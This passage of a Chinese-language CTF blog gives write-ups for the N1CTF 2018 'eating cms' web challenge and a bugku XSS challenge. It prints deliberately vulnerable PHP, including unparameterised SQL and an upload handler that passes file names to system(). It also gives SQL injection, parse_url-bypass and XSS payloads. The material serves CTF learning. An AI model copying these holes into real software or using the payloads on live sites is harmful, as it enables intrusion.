class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">"config.php"</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    Header(<span class="hljs-string">"Location: hacker.php"</span>);</span><br><span class="line">    <span class="hljs-keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="hljs-string">"flag"</span>,<span class="hljs-string">"manage"</span>,<span class="hljs-string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="hljs-string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="hljs-string">'query'</span>], $query);</span><br><span class="line"><span class="hljs-comment">//    var_dump($query);</span></span><br><span class="line"><span class="hljs-comment">//    die();</span></span><br><span class="line">    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="hljs-keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="hljs-string">"flag"</span>,<span class="hljs-string">"manage"</span>,<span class="hljs-string">"ffffllllaaaaggg"</span>,<span class="hljs-string">"info"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="hljs-string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="hljs-string">'query'</span>], $query);</span><br><span class="line"><span class="hljs-comment">//    var_dump($query);</span></span><br><span class="line"><span class="hljs-comment">//    die();</span></span><br><span class="line">    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="hljs-keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span><span class="hljs-params">($string)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="hljs-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span>;</span><br><span class="line">    $whitelist = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;"</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-string">"$whitelist"</span>, $string[$i]) === <span class="hljs-keyword">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/$blacklist/is"</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span><span class="hljs-params">($sql_query)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="hljs-keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">($user, $pass)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="hljs-string">"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'"</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="hljs-comment">//    var_dump($res);</span></span><br><span class="line"><span class="hljs-comment">//    die();</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="hljs-string">'user'</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="hljs-string">'login'</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">        $_SESSION[<span class="hljs-string">'isadmin'</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span><span class="hljs-params">($level,$user)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $sql = <span class="hljs-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' "</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="hljs-comment">//    var_dump($res);</span></span><br><span class="line"><span class="hljs-comment">//    die();</span></span><br><span class="line"><span class="hljs-comment">//    die($res);</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($res == <span class="hljs-number">1</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span><span class="hljs-params">($user, $pass)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="hljs-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')"</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line">    <span class="hljs-keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="hljs-string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>config.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line">define(BASEDIR, <span class="hljs-string">"/var/www/html/"</span>);</span><br><span class="line">define(FLAG_SIG, <span class="hljs-number">1</span>);</span><br><span class="line">$OPERATE = <span class="hljs-keyword">array</span>(<span class="hljs-string">'userinfo'</span>,<span class="hljs-string">'upload'</span>,<span class="hljs-string">'search'</span>);</span><br><span class="line">$OPERATE_admin = <span class="hljs-keyword">array</span>(<span class="hljs-string">'userinfo'</span>,<span class="hljs-string">'upload'</span>,<span class="hljs-string">'search'</span>,<span class="hljs-string">'manage'</span>);</span><br><span class="line">$DBHOST = <span class="hljs-string">"localhost"</span>;</span><br><span class="line">$DBUSER = <span class="hljs-string">"root"</span>;</span><br><span class="line">$DBPASS = <span class="hljs-string">"Nu1LCTF2018!@#qwe"</span>;</span><br><span class="line"><span class="hljs-comment">//$DBPASS = "";</span></span><br><span class="line">$DBNAME = <span class="hljs-string">"N1CTF"</span>;</span><br><span class="line">$mysqli = @<span class="hljs-keyword">new</span> mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);</span><br><span class="line"><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"no sql connection"</span>.mysqli_connect_error();</span><br><span class="line">        $mysqli=<span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>user.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">"function.php"</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( $_SESSION[<span class="hljs-string">'user'</span>] ))&#123;</span><br><span class="line">    Header(<span class="hljs-string">"Location: index.php"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'isadmin'</span>] === <span class="hljs-string">'1'</span>)&#123;</span><br><span class="line">    $oper_you_can_do = $OPERATE_admin;</span><br><span class="line">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    $oper_you_can_do = $OPERATE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-comment">//die($_SESSION['isadmin']);</span></span><br><span class="line"><span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'isadmin'</span>] === <span class="hljs-string">'1'</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>]) || $_GET[<span class="hljs-string">'page'</span>] === <span class="hljs-string">''</span>)&#123;</span><br><span class="line">        $page = <span class="hljs-string">'info'</span>;</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        $page = $_GET[<span class="hljs-string">'page'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>])|| $_GET[<span class="hljs-string">'page'</span>] === <span class="hljs-string">''</span>)&#123;</span><br><span class="line">        $page = <span class="hljs-string">'guest'</span>;</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        $page = $_GET[<span class="hljs-string">'page'</span>];</span><br><span class="line">        <span class="hljs-keyword">if</span>($page === <span class="hljs-string">'info'</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="hljs-comment">//            echo("&lt;script&gt;alert('no premission to visit info, only admin can, you are guest')&lt;/script&gt;");</span></span><br><span class="line">            Header(<span class="hljs-string">"Location: user.php?page=guest"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter_directory();</span><br><span class="line"><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="hljs-comment">//    $page = 'info';</span></span><br><span class="line"><span class="hljs-comment">//&#125;</span></span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"$page.php"</span>;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;以上就是一开始能读到的源码。想试图尝试读取<code>flag、ffffllllaaaaggg</code>，但发现有过滤，会被重定向到<code>hacker</code>。然后在用<code>zap</code>抓包的时候发现了hint。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/15.png"><br></div><br>&emsp;&emsp;但由于过滤的原因，无法访问此文件，但这个hint也为我们指明了方向，接下来尝试了一下<code>敏感目录扫描</code>，然后就发现了<code>.viminfo</code>泄露。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/13.png"><br></div><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can not visit it directly "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"templates/update.html"</span>;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;尝试访问了一下：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/14.png"><br></div><br>&emsp;&emsp;再去读取<code>updateadmin233333333333333.php</code>的源码，发现跟<code>updateadmin.php</code>的源码相同。</p>
+<p>&emsp;&emsp;然后自己当时想到的点就是：</p>
+<ul>
+<li><strong>1、绕过isadmin验证</strong></li>
+<li><strong>2、绕过filter_directory()过滤</strong></li>
+</ul>
+<p>&emsp;&emsp;先尝试的进行<code>register</code>注册账号时进行注入，致使<code>isadmin</code>置为<code>1</code>，尝试构造了的payload：<code>hahaha&#39;,&#39;123&#39;,&#39;1&#39;)-- +</code>，但是可以看到有白名单限制，它过滤了空格，所以这个猜想看起来行不通。</p>
+<p>&emsp;&emsp;再进行<code>filter_directory</code>绕过时自己没有看出tips，看出来估计这里就不用停那么久了。。。后来逼得没办法了，就将它里面的关键代码拿去google了一下，这下还真有发现。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/16.png" width="50%"><br></div><br>&emsp;&emsp;打开后就找到了payload：</p>
+<blockquote>
+<p>这里用到了 parse_url 函数在解析 url 时存在的 bug，通过：////x.php?key=value 的方式可以使其返回 False。</p>
+</blockquote>
+<p>&emsp;&emsp;拿着这个payload，发现果真有用。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/17.png" width="50%"><br></div><br>&emsp;&emsp;读它的源码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"templates/upload2323233333.html"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;发现并没有什么有用的信息，接着访问一下。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/18.png"><br></div><br>&emsp;&emsp;在读<code>upllloadddd.php</code>的源码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">"gif"</span>,<span class="hljs-string">"png"</span>,<span class="hljs-string">"jpg"</span>);</span><br><span class="line">$size = <span class="hljs-number">10000000</span>;</span><br><span class="line">$path = <span class="hljs-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>];</span><br><span class="line"><span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="hljs-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="hljs-string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="hljs-string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'error'</span>]&gt;<span class="hljs-number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="hljs-string">"."</span>,$_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]));</span><br><span class="line"><span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;将关键部分的代码<code>Google一下</code>，然后又发现了几乎一样的源码。。。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/19.png" width="50%"><br></div><br>&emsp;&emsp;他这里的payload是：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/20.png" width="50%"><br></div><br>&emsp;&emsp;由于找到此篇文章的时候已经比赛结束了，，拿着它提供的脚本跑了一会却没有按他说预言的生成<code>php</code>文件，所以就从<code>ctftime</code>上找了一篇writeup照着复现一下。</p>
+<p>&emsp;&emsp;因为他执行的是<code>system()</code>函数，所以这里可以造成<code>任意代码执行</code>漏洞。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/21.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/22.png" height="50%"><br></div><br>&emsp;&emsp;再查看上一级目录：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/23.png" height="50%"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/24.png" height="50%"><br></div><br>&emsp;&emsp;读取这个文件，发现直接<code>cat ../flag_233333</code>不行，<code>/</code>被过滤掉了，不过我们可以<code>cd ..</code>再读。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/25.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/26.png"><br></div><br>&emsp;&emsp;至此，成功拿到<code>flag</code>。这道题自己学到了很多，也意识到了自己的经验还是不足，以后必将勤加练习，当然还是要留意细节跟善用搜索引擎。。。</p>
+<p>&emsp;&emsp;希望能在这条路上走远一点:)</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://fireshellsecurity.team/n1ctf-funning-eating-cms/" target="_blank" rel="noopener">[<em>]N1CTF 2018 - Funning eating cms</em></a><br><br><a href="http://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">[]Web中的条件竞争漏洞</a><br><br><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="noopener">[<em>]GeekPwn2016跨次元CTF Writeup</em></a><br><br><a href="http://sol.logdown.com/posts/2016/07/14/ais3-pre-exam-2016-part-write-up" target="_blank" rel="noopener">[]web</a></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-07T16:40:00.000Z">2018-03-08</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 分钟 读完 (大约 1640 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/bugku-ctf-writeup2/">bugku ctf writeup2</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇开始bugku高级篇。。。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="XSS注入测试"><a href="#XSS注入测试" class="headerlink" title="XSS注入测试"></a>XSS注入测试</h3><p>&emsp;&emsp;题目描述：</p>
+<blockquote>
+<p>1、请注入一段XSS代码，获取Flag值<br>2、必须包含alert(<em>key</em>)，<em>key</em>会自动被替换</p>
+</blockquote>
+<p>&emsp;&emsp;随便测试了一下，发现会对字符进行实体编码。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/29.png"><br></div><br>&emsp;&emsp;注意到页面是utf-8编码，id传入代码会在s中运行，考虑将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来<br>&emsp;&emsp;所以payload：<code>?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</code>，访问后查看源代码即可得到flag。<br><br>### never give up<br>&emsp;&emsp;查看题目的源代码如下：<br><div align="center"><br>    <img src="/images/posts/bugku/30.png"><br></div><br>&emsp;&emsp;访问<code>1p.html</code>，注意是在查看源代码的地方访问，然后可以发现加密了的字符串。<br><div align="center"><br>    <img src="/images/posts/bugku/31.png"><br></div><br>&emsp;&emsp;拿去解密，这里不累赘。直接放出源代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="hljs-string">'Location: hello.php?id=1'</span>);</span><br><span class="line">    <span class="hljs-keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="hljs-string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="hljs-string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="hljs-string">'b'</span>];</span><br><span class="line"><span class="hljs-keyword">if</span>(stripos($a,<span class="hljs-string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no no no no no no no'</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="hljs-string">'r'</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>($data==<span class="hljs-string">"bugku is a nice plateform!"</span> <span class="hljs-keyword">and</span> $id==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen($b)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">"111"</span>.substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) <span class="hljs-keyword">and</span> substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">require</span>(<span class="hljs-string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 